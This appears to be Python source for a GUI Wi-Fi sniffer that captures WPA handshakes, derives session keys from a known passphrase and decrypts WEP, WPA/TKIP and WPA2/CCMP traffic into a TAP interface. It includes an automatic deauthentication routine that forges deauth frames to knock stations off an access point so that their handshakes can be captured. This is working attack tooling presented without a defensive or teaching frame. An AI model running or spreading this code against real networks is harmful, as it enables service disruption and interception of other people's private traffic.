from threading import Thread
import logging
logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
from scapy.all import *
conf.verb = 0
import os,  struct
from Crypto.Cipher import ARC4,  AES
from pbkdf2 import PBKDF2
from binascii import a2b_hex,  b2a_hex,  a2b_qp
import hmac,hashlib

class WPASession:
    def __init__(self, sta_mac):
        self.ANonce = ''
        self.SNonce = ''
        self.tk_key = ''
        self.sta_mac = sta_mac
        self.deauth_count = 0
        self.is_active = False

    def add_count(self):
        self.deauth_count += 1 
    
    def reset_count(self):
        self.deauth_count  = 0
        
    def activate(self):
        if not self.is_active and self.ANonce != '' and self.SNonce != '':
            self.is_active = True
            return True
        return False
        
    def __PRF512(self, pmk, A, B):
        ptk1 = hmac.new(pmk, a2b_qp(A)+ B + chr(0), hashlib.sha1).digest()
        ptk2 = hmac.new(pmk, a2b_qp(A)+ B + chr(1), hashlib.sha1).digest()
        ptk3 = hmac.new(pmk, a2b_qp(A)+ B + chr(2), hashlib.sha1).digest()
        ptk4 = hmac.new(pmk, a2b_qp(A)+ B + chr(3), hashlib.sha1).digest()
        return ptk1+ptk2+ptk3+ptk4[0:4]
        
    def gernerate_ptk(self,  passphrase, ssid,  ap_mac):
        sta_mac = a2b_hex(self.sta_mac.replace(':', ''))
        ap_mac = a2b_hex(ap_mac.replace(':', ''))
        ANonce = self.ANonce
        SNonce = self.SNonce
        
        psk = PBKDF2(passphrase, ssid, 4096).read(32) #pmk: psk
        B = min(ap_mac, sta_mac)+max(ap_mac, sta_mac)\
        +min(ANonce, SNonce)+max(ANonce, SNonce)        
        ptk = self.__PRF512(psk, 'Pairwise key expansion\0', B)
        #KCK = ptk[0:16], KEK = ptk[16:32]
        TK = ptk[32:48]
        self.tk_key = TK
    
class Decrypter:
    tkip_sbox = [
    [
        0xC6A5, 0xF884, 0xEE99, 0xF68D, 0xFF0D, 0xD6BD, 0xDEB1, 0x9154,
        0x6050, 0x0203, 0xCEA9, 0x567D, 0xE719, 0xB562, 0x4DE6, 0xEC9A,
        0x8F45, 0x1F9D, 0x8940, 0xFA87, 0xEF15, 0xB2EB, 0x8EC9, 0xFB0B,
        0x41EC, 0xB367, 0x5FFD, 0x45EA, 0x23BF, 0x53F7, 0xE496, 0x9B5B,
        0x75C2, 0xE11C, 0x3DAE, 0x4C6A, 0x6C5A, 0x7E41, 0xF502, 0x834F,
        0x685C, 0x51F4, 0xD134, 0xF908, 0xE293, 0xAB73, 0x6253, 0x2A3F,
        0x080C, 0x9552, 0x4665, 0x9D5E, 0x3028, 0x37A1, 0x0A0F, 0x2FB5,
        0x0E09, 0x2436, 0x1B9B, 0xDF3D, 0xCD26, 0x4E69, 0x7FCD, 0xEA9F,
        0x121B, 0x1D9E, 0x5874, 0x342E, 0x362D, 0xDCB2, 0xB4EE, 0x5BFB,
        0xA4F6, 0x764D, 0xB761, 0x7DCE, 0x527B, 0xDD3E, 0x5E71, 0x1397,
        0xA6F5, 0xB968, 0x0000, 0xC12C, 0x4060, 0xE31F, 0x79C8, 0xB6ED,
        0xD4BE, 0x8D46, 0x67D9, 0x724B, 0x94DE, 0x98D4, 0xB0E8, 0x854A,
        0xBB6B, 0xC52A, 0x4FE5, 0xED16, 0x86C5, 0x9AD7, 0x6655, 0x1194,
        0x8ACF, 0xE910, 0x0406, 0xFE81, 0xA0F0, 0x7844, 0x25BA, 0x4BE3,
        0xA2F3, 0x5DFE, 0x80C0, 0x058A, 0x3FAD, 0x21BC, 0x7048, 0xF104,
        0x63DF, 0x77C1, 0xAF75, 0x4263, 0x2030, 0xE51A, 0xFD0E, 0xBF6D,
        0x814C, 0x1814, 0x2635, 0xC32F, 0xBEE1, 0x35A2, 0x88CC, 0x2E39,
        0x9357, 0x55F2, 0xFC82, 0x7A47, 0xC8AC, 0xBAE7, 0x322B, 0xE695,
        0xC0A0, 0x1998, 0x9ED1, 0xA37F, 0x4466, 0x547E, 0x3BAB, 0x0B83,
        0x8CCA, 0xC729, 0x6BD3, 0x283C, 0xA779, 0xBCE2, 0x161D, 0xAD76,
        0xDB3B, 0x6456, 0x744E, 0x141E, 0x92DB, 0x0C0A, 0x486C, 0xB8E4,
        0x9F5D, 0xBD6E, 0x43EF, 0xC4A6, 0x39A8, 0x31A4, 0xD337, 0xF28B,
        0xD532, 0x8B43, 0x6E59, 0xDAB7, 0x018C, 0xB164, 0x9CD2, 0x49E0,
        0xD8B4, 0xACFA, 0xF307, 0xCF25, 0xCAAF, 0xF48E, 0x47E9, 0x1018,
        0x6FD5, 0xF088, 0x4A6F, 0x5C72, 0x3824, 0x57F1, 0x73C7, 0x9751,
        0xCB23, 0xA17C, 0xE89C, 0x3E21, 0x96DD, 0x61DC, 0x0D86, 0x0F85,
        0xE090, 0x7C42, 0x71C4, 0xCCAA, 0x90D8, 0x0605, 0xF701, 0x1C12,
        0xC2A3, 0x6A5F, 0xAEF9, 0x69D0, 0x1791, 0x9958, 0x3A27, 0x27B9,
        0xD938, 0xEB13, 0x2BB3, 0x2233, 0xD2BB, 0xA970, 0x0789, 0x33A7,
        0x2DB6, 0x3C22, 0x1592, 0xC920, 0x8749, 0xAAFF, 0x5078, 0xA57A,
        0x038F, 0x59F8, 0x0980, 0x1A17, 0x65DA, 0xD731, 0x84C6, 0xD0B8,
        0x82C3, 0x29B0, 0x5A77, 0x1E11, 0x7BCB, 0xA8FC, 0x6DD6, 0x2C3A],
    [
        0xA5C6, 0x84F8, 0x99EE, 0x8DF6, 0x0DFF, 0xBDD6, 0xB1DE, 0x5491,
        0x5060, 0x0302, 0xA9CE, 0x7D56, 0x19E7, 0x62B5, 0xE64D, 0x9AEC,
        0x458F, 0x9D1F, 0x4089, 0x87FA, 0x15EF, 0xEBB2, 0xC98E, 0x0BFB,
        0xEC41, 0x67B3, 0xFD5F, 0xEA45, 0xBF23, 0xF753, 0x96E4, 0x5B9B,
        0xC275, 0x1CE1, 0xAE3D, 0x6A4C, 0x5A6C, 0x417E, 0x02F5, 0x4F83,
        0x5C68, 0xF451, 0x34D1, 0x08F9, 0x93E2, 0x73AB, 0x5362, 0x3F2A,
        0x0C08, 0x5295, 0x6546, 0x5E9D, 0x2830, 0xA137, 0x0F0A, 0xB52F,
        0x090E, 0x3624, 0x9B1B, 0x3DDF, 0x26CD, 0x694E, 0xCD7F, 0x9FEA,
        0x1B12, 0x9E1D, 0x7458, 0x2E34, 0x2D36, 0xB2DC, 0xEEB4, 0xFB5B,
        0xF6A4, 0x4D76, 0x61B7, 0xCE7D, 0x7B52, 0x3EDD, 0x715E, 0x9713,
        0xF5A6, 0x68B9, 0x0000, 0x2CC1, 0x6040, 0x1FE3, 0xC879, 0xEDB6,
        0xBED4, 0x468D, 0xD967, 0x4B72, 0xDE94, 0xD498, 0xE8B0, 0x4A85,
        0x6BBB, 0x2AC5, 0xE54F, 0x16ED, 0xC586, 0xD79A, 0x5566, 0x9411,
        0xCF8A, 0x10E9, 0x0604, 0x81FE, 0xF0A0, 0x4478, 0xBA25, 0xE34B,
        0xF3A2, 0xFE5D, 0xC080, 0x8A05, 0xAD3F, 0xBC21, 0x4870, 0x04F1,
        0xDF63, 0xC177, 0x75AF, 0x6342, 0x3020, 0x1AE5, 0x0EFD, 0x6DBF,
        0x4C81, 0x1418, 0x3526, 0x2FC3, 0xE1BE, 0xA235, 0xCC88, 0x392E,
        0x5793, 0xF255, 0x82FC, 0x477A, 0xACC8, 0xE7BA, 0x2B32, 0x95E6,
        0xA0C0, 0x9819, 0xD19E, 0x7FA3, 0x6644, 0x7E54, 0xAB3B, 0x830B,
        0xCA8C, 0x29C7, 0xD36B, 0x3C28, 0x79A7, 0xE2BC, 0x1D16, 0x76AD,
        0x3BDB, 0x5664, 0x4E74, 0x1E14, 0xDB92, 0x0A0C, 0x6C48, 0xE4B8,
        0x5D9F, 0x6EBD, 0xEF43, 0xA6C4, 0xA839, 0xA431, 0x37D3, 0x8BF2,
        0x32D5, 0x438B, 0x596E, 0xB7DA, 0x8C01, 0x64B1, 0xD29C, 0xE049,
        0xB4D8, 0xFAAC, 0x07F3, 0x25CF, 0xAFCA, 0x8EF4, 0xE947, 0x1810,
        0xD56F, 0x88F0, 0x6F4A, 0x725C, 0x2438, 0xF157, 0xC773, 0x5197,
        0x23CB, 0x7CA1, 0x9CE8, 0x213E, 0xDD96, 0xDC61, 0x860D, 0x850F,
        0x90E0, 0x427C, 0xC471, 0xAACC, 0xD890, 0x0506, 0x01F7, 0x121C,
        0xA3C2, 0x5F6A, 0xF9AE, 0xD069, 0x9117, 0x5899, 0x273A, 0xB927,
        0x38D9, 0x13EB, 0xB32B, 0x3322, 0xBBD2, 0x70A9, 0x8907, 0xA733,
        0xB62D, 0x223C, 0x9215, 0x20C9, 0x4987, 0xFFAA, 0x7850, 0x7AA5,
        0x8F03, 0xF859, 0x8009, 0x171A, 0xDA65, 0x31D7, 0xC684, 0xB8D0,
        0xC382, 0xB029, 0x775A, 0x111E, 0xCB7B, 0xFCA8, 0xD66D, 0x3A2C]
]
    def __S(self,  i):
        return self.tkip_sbox[0][i & 0xff] ^ self.tkip_sbox[1][(i >> 8)]    

    def __ubyte(self,  data):
        return (data>>8)&0xff

    def __lbyte(self,  data):
        return data&0xff

    def __ROR(self,  data):
        return ((data >> 1) & 0x7fff) | (data << 15);

    def __combine(self,  X, Y):
        return (ord(X)<<8)|ord(Y)
        
    def unwep(self,  wep_pkt,  passphrase):
        iv = wep_pkt.iv
        enc_data = wep_pkt.wepdata
        rc4 = ARC4.new(iv + passphrase)
        dec_data = rc4.decrypt(enc_data)
        return LLC(dec_data)

    def unwpa(self, wep_pkt, TK,  TA):
        TSCU = wep_pkt.wepdata[:4][::-1]
        TSCL = wep_pkt.iv[0]+wep_pkt.iv[2]
        TA = a2b_hex(TA.replace(':', ''))
        
        #phase1_1
        P1K0 = self.__combine(TSCU[0], TSCU[1]) #TSC1
        P1K1 = self.__combine(TSCU[2], TSCU[3]) #TSC2
        P1K2 = self.__combine(TA[1], TA[0])
        P1K3 = self.__combine(TA[3], TA[2])
        P1K4 = self.__combine(TA[5], TA[4])

        #phase1_2
        for i in range(4):
            P1K0 = (P1K0 + self.__S(P1K4^self.__combine(TK[1], TK[0])))&0xffff
            P1K1 = (P1K1 + self.__S(P1K0^self.__combine(TK[5], TK[4])))&0xffff
            P1K2 = (P1K2 + self.__S(P1K1^self.__combine(TK[9], TK[8])))&0xffff
            P1K3 = (P1K3 + self.__S(P1K2^self.__combine(TK[13],TK[12])))&0xffff
            P1K4 = (P1K4 + self.__S(P1K3^self.__combine(TK[1], TK[0])) + 2*i)&0xffff
            P1K0 = (P1K0 + self.__S(P1K4^self.__combine(TK[3], TK[2])))&0xffff
            P1K1 = (P1K1 + self.__S(P1K0^self.__combine(TK[7], TK[6])))&0xffff
            P1K2 = (P1K2 + self.__S(P1K1^self.__combine(TK[11], TK[10])))&0xffff
            P1K3 = (P1K3 + self.__S(P1K2^self.__combine(TK[15], TK[14])))&0xffff
            P1K4 = (P1K4 + self.__S(P1K3^self.__combine(TK[3], TK[2])) + 2*i + 1)&0xffff

        #phase2_1
        PPK0 = P1K0
        PPK1 = P1K1
        PPK2 = P1K2
        PPK3 = P1K3
        PPK4 = P1K4
        PPK5 = (P1K4 + self.__combine(TSCL[0], TSCL[1]))&0xffff #TSC0

        #phase2_2
        PPK0 = (PPK0 + self.__S(PPK5 ^ self.__combine(TK[1], TK[0])))&0xffff
        PPK1 = (PPK1 + self.__S(PPK0 ^ self.__combine(TK[3], TK[2])))&0xffff
        PPK2 = (PPK2 + self.__S(PPK1 ^ self.__combine(TK[5], TK[4])))&0xffff
        PPK3 = (PPK3 + self.__S(PPK2 ^ self.__combine(TK[7], TK[6])))&0xffff
        PPK4 = (PPK4 + self.__S(PPK3 ^ self.__combine(TK[9], TK[8])))&0xffff
        PPK5 = (PPK5 + self.__S(PPK4 ^ self.__combine(TK[11], TK[10])))&0xffff
        PPK0 = (PPK0 + self.__ROR(PPK5 ^ self.__combine(TK[13], TK[12])))&0xffff
        PPK1 = (PPK1 + self.__ROR(PPK0 ^ self.__combine(TK[15], TK[14])))&0xffff
        PPK2 = (PPK2 + self.__ROR(PPK1))&0xffff
        PPK3 = (PPK3 + self.__ROR(PPK2))&0xffff
        PPK4 = (PPK4 + self.__ROR(PPK3))&0xffff
        PPK5 = (PPK5 + self.__ROR(PPK4))&0xffff

        #phase2_3
        rc4_key = [0]*16
        rc4_key[0] = ord(TSCL[0])
        rc4_key[1] = (rc4_key[0] | 0x20) & 0x7f
        rc4_key[2] = ord(TSCL[1])
        rc4_key[3] = self.__lbyte((PPK5 ^ self.__combine(TK[1], TK[0])) >> 1)
        rc4_key[4] = self.__lbyte(PPK0)
        rc4_key[5] = self.__ubyte(PPK0)
        rc4_key[6] = self.__lbyte(PPK1)
        rc4_key[7] = self.__ubyte(PPK1)
        rc4_key[8] = self.__lbyte(PPK2)
        rc4_key[9] = self.__ubyte(PPK2)
        rc4_key[10] = self.__lbyte(PPK3)
        rc4_key[11] = self.__ubyte(PPK3)
        rc4_key[12] = self.__lbyte(PPK4)
        rc4_key[13] = self.__ubyte(PPK4)
        rc4_key[14] = self.__lbyte(PPK5)
        rc4_key[15] = self.__ubyte(PPK5)
        rc4_key = ''.join(map(lambda x: chr(x), rc4_key))

        enc_data = wep_pkt.wepdata[4:-8]
        rc4 = ARC4.new(rc4_key)
        dec_data = rc4.decrypt(enc_data)
        
        print repr(dec_data)
        return LLC(dec_data)


    def unwpa2(self, wep_pkt, tk_key,  TA):
        TA = a2b_hex(TA.replace(':', ''))
        PN = wep_pkt.wepdata[:4][::-1]
        PN += wep_pkt.iv[:2][::-1]
        Flag = '\x01'
        Priority = '\x00'
        
        #exclude 8byte CBC-MAC (4byte: wep_data[:-4] and 4byte: wep_pkt.icv)
        enc_data = wep_pkt.wepdata[4:-4]   
        dec_data = ''
        block_len = len(enc_data)/16 + (0 if len(enc_data)%16 == 0 else 1)
        
        for i in range(block_len):
          counter = Flag+Priority+TA+PN+struct.pack('>h', i+1)
          cipher = AES.AESCipher(tk_key, AES.MODE_ECB)
          ciphertext = cipher.encrypt(counter)
          
          for j, echar in enumerate(enc_data[16*i:16*(i+1)]):
            dec_data += chr(ord(echar)^ord(ciphertext[j]))

        return LLC(dec_data)
    
class SniffingThread(Thread):
    def __init__(self,  sniffer):
        Thread.__init__(self)
        self.__exit = False
        self.sniffer = sniffer
        self.decrpyter = Decrypter()
        self.session_list = []
        self.ap_mac = self.sniffer.bssid
        
    def run(self):
        sniff(iface=self.sniffer.wlan.interface, store=0, prn=self.cb_sniff,  stop_filter=self.cb_stop)

    def __get_session(self,  sta_mac):
        session = filter(lambda session: session.sta_mac == sta_mac, self.session_list)
        if session == []:
            return False
        return  session[0]

    def __get_active_session(self,  sta_mac):
        session = self.__get_session(sta_mac)
        if not session and self.sniffer.deauth:
            #add session for deauth
            session = WPASession(sta_mac)
            self.session_list.append(session)
        elif session:
            if session.is_active:
                #decryption available
                return session
            elif self.sniffer.deauth:
                session.add_count()
                if session.deauth_count > 15:
                    #deauth
                    session.reset_count()
                    self.__send_deauth(sta_mac, self.ap_mac)
                    self.sniffer.ui.textEdit_log.append('[+] send deauth packet !! (\'%s\')' % sta_mac)
        return

    def __send_deauth(self, sta_mac,  ap_mac):
        deauth_pkt1 = Dot11(addr1=sta_mac, addr2=ap_mac, addr3=ap_mac)/Dot11Deauth()
        deauth_pkt2 = Dot11(addr1=ap_mac, addr2=sta_mac, addr3=ap_mac)/Dot11Deauth()
        send(deauth_pkt1, inter=0, count=1)
        send(deauth_pkt2, inter=0, count=1)

    def cb_sniff(self,  pkt):
        if pkt.haslayer(Dot11QoS):
            #sta filter
            if self.sniffer.sta_mac in [pkt.addr1,  pkt.addr2,  pkt.addr3] or self.sniffer.sta_mac == '':
                #ap filter
                if self.ap_mac in [pkt.addr1,  pkt.addr2,  pkt.addr3]:
                    sta_mac = pkt.addr2 if pkt.addr1 == self.ap_mac else pkt.addr1
                    
                    #sniff EAPOL
                    if pkt.haslayer(EAPOL):
                        session = self.__get_session(sta_mac)
                        if not session:
                            session = WPASession(sta_mac)
                            self.session_list.append(session)
                            
                        eapol_raw = pkt.getlayer(Raw).load
                        mic = eapol_raw[13+32+32:13+32+32+16]
                        if mic == '\x00'*16:
                            #eapol message1 (reset Nonce)
                            session.SNonce = ''
                            session.ANonce =''
                            session.is_active = False
                            
                        tmp_nonce = eapol_raw[13:13+32]    
                        if pkt.addr1 == self.ap_mac:
                            if session.SNonce == '' and tmp_nonce.strip('\x00') != '':
                                session.SNonce = tmp_nonce
                        else:
                            if session.ANonce == '' and tmp_nonce.strip('\x00') != '':
                                session.ANonce = tmp_nonce
                        if session.activate():
                            session.gernerate_ptk(self.sniffer.key, self.sniffer.ssid, self.ap_mac)
                            self.sniffer.ui.textEdit_log.append('[+] gererate TK key !! (\'%s\')' % sta_mac)
                    else:
                        #OPEN
                        if self.sniffer.enc == 0:
                            de_pkt = pkt
                        else:
                            if not pkt.haslayer(Dot11WEP):
                                return
                            wep_pkt = pkt.getlayer(Dot11WEP)
                            
                            #WEP
                            if self.sniffer.enc == 1:                       
                                de_pkt = self.decrpyter.unwep(wep_pkt,  self.sniffer.key)
                            else:
                                #session check
                                session = self.__get_active_session(sta_mac)
                                if not session:
                                    return
                                
                                #toDS, fromDS
                                TA = sta_mac if (pkt.FCfield & 0x1) else self.ap_mac
                                #WPA/TKIP
                                if self.sniffer.enc == 2:
                                    de_pkt = self.decrpyter.unwpa(wep_pkt,  session.tk_key,  TA)
                                #WPA2/CCMP
                                elif self.sniffer.enc == 3:
                                    de_pkt = self.decrpyter.unwpa2(wep_pkt,  session.tk_key,  TA)
                                    
                        #send packet
                        if de_pkt.haslayer(SNAP):
                            snap_data = de_pkt.getlayer(SNAP)
                            send_pkt = self.__make_ether(pkt, snap_data.code)/snap_data.payload
                            self.sniffer.send_packet(send_pkt)
                        
    def cb_stop(self, pkt):
        if self.__exit:
            return True

    def exit(self):
        self.__exit = True
        
    def __make_ether(self, pkt, code):
        to_ds = pkt.FCfield & 0x1
        from_ds = pkt.FCfield & 0x2

        if to_ds and from_ds:
            return Ether(dst=pkt.addr1, src=pkt.addr3, type=code)
        elif to_ds and (not from_ds):
            return Ether(dst=pkt.addr3, src=pkt.addr2, type=code)
        else:
            return Ether(dst=pkt.addr1, src=pkt.addr2, type=code)


class Sniffer:
    TUNSETIFF = 0x400454ca
    IFF_TAP = 0x0002
    IFF_NO_PI = 0x1000

    def __init__(self, ui,  wlan):
        self.ui = ui
        self.wlan = wlan
        self.sniffing_thread = None
        self.sniff_fd = None
        self.deauth_list = []
        
    def __value_check(self):
        self.bssid = str(self.ui.lineEdit_bssid.text())
        self.sta_mac = str(self.ui.lineEdit_sta.text())
        self.ssid = str(self.ui.lineEdit_ssid.text())
        self.enc = self.ui.comboBox_enc.currentIndex()
        self.channel = self.ui.spinBox_channel.value()
        self.key = str(self.ui.lineEdit_key.text())
        self.hex = False if self.ui.checkBox_hex.checkState() == 0 else True
        self.deauth = False if self.ui.checkBox_deauth.checkState() == 0 else True
        
        #wpa, wpa2 need SSID
        if self.enc in [2, 3] and self.ssid == '':
            return 'Invalid SSID'
        if self.enc in [1, 2, 3] and self.key == '':
            return 'Invalid KEY'
        if self.enc == 1:
            if len(self.key) not in ([10,  26] if self.hex else [5,  13] ):
                return 'Invalid WEP KEY'            
        elif self.bssid.count('-') != 5  and self.bssid.count(':') != 5:
            return 'Invalid BSSID'
        elif self.sta_mac != '' and self.sta_mac.count('-') != 5  and self.sta_mac.count(':') != 5:
            return 'Invalid STA MAC'
    
        self.ui.textEdit_log.clear()
        if self.ssid:
            self.ui.textEdit_log.append('[*] AP SSID : %s' % self.ssid)
        self.ui.textEdit_log.append('[*] AP Filter : %s' % self.bssid)
        self.ui.textEdit_log.append('[*] CHANNEL : %s' % self.channel)
        self.ui.textEdit_log.append('[*] ENC : %s ' % ['OPEN',  'WEP', 'WPA',  'WPA2'][self.enc])
        if self.key:
            self.ui.textEdit_log.append('[*] KEY : %s%s' % (self.key, ' (hex)' if self.hex else ''))
        if self.sta_mac != '':
            self.ui.textEdit_log.append('[*] STA Filter : %s' % self.sta_mac)
        if self.deauth:
            if self.enc not in [2,  3]:
                self.deauth = False
            else:
                self.ui.textEdit_log.append('[*] Auto Deauthentication')
                conf.iface = self.wlan.interface
        self.ui.textEdit_log.append('')
        
        if self.hex:
            self.key = a2b_hex(self.key.decode)
            
    def send_packet(self,  pkt):
        try:
            os.write(self.sniff_fd, str(pkt))
        except:
            pass
        
    def __set_sniffing_interface(self):
        try:
            self.sniff_fd = os.open('/dev/net/tun', os.O_RDWR)
            ifs = ioctl(self.sniff_fd, self.TUNSETIFF, struct.pack('16sH', 'DeSniffer0', self.IFF_TAP|self.IFF_NO_PI))
            ifname = ifs[:16].strip("\x00")
            os.system('ifconfig %s up' % ifname)
            self.ui.textEdit_log.append('[+] \'%s\' is activated ...' % ifname)
        except IOError:
            return 'interface is busy'
        ipv6_disable_path = '/proc/sys/net/ipv6/conf/%s/' % ifname
        if os.path.exists(ipv6_disable_path):
            os.system('echo 1 > %s/disable_ipv6' % ipv6_disable_path)
        return 

    def __change_channel(self):
        self.ui.textEdit_log.append('[+] change channel : %s' % self.channel)
        self.wlan.change_channel(self.channel)

    def start(self):
        status = self.__value_check()
        if status != None:
            return status
            
        if not self.sniffing_thread:
            #change channel
            self.__change_channel()
            #activate tap interface
            status = self.__set_sniffing_interface()
            if status != None:
                return status
            self.sniffing_thread = SniffingThread(self)
            self.sniffing_thread.start()
            
    def stop(self):       
        if self.sniffing_thread:
            self.sniffing_thread.exit()
            del self.sniffing_thread
            self.sniffing_thread = None

        if self.sniff_fd:
            os.close(self.sniff_fd)
            self.sniff_fd = None
        self.deauth_list = []
        self.ui.textEdit_log.append('[+] stopped sniffing ...')
        
        
            
            
